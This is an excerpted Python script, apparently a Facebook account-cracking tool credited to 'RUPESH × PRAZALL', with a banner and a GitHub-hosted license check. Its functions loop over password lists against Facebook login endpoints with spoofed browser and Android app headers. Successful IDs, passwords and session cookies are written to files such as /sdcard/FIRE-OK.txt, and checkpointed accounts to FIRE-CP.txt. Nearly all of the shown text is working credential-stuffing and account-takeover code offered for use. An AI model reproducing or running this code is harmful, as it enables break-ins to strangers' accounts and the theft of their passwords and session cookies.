...
$$$$$$$/  $$/  $$$$$$$/  $$$$$$$/ $$/   $$/       $$/      $$/  $$$$$$$/ $$$$$$$/  $$/   $$/ 
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┃ [\033[1;91m✓\033[1;92m] CREATOR \033[1;91m: \033[1;92mRUPESH × PRAZALL 
 ...
 ┃ [\033[1;91m✓\033[1;92m] Facebook  \033[1;91m: \033[1;92mOBITO HERE😎 And Przal Brand
 ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.2.4 
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def meyexudi():
  ...
  id = "x".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Rupesh-Don-Here/King/blob/main/king.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [FIRE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'nFIREgate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        if "c_user" in Shahin:
                                ...
                                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua_string = f'DFIREk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
def rcrack_free(idf,pwv):
	...
	try:
		for ps in pwv:
			...
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/FIREf,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Google Chrome";v="100", "Not)A;Brand";v="99", "Chromium";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'nFIREgate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[FIRE-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				open('ok.txt', 'a').write(idf+' | '+ps+' | '+kuki+'\n')
				oks.append(idf)
				break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [RED-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n');
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
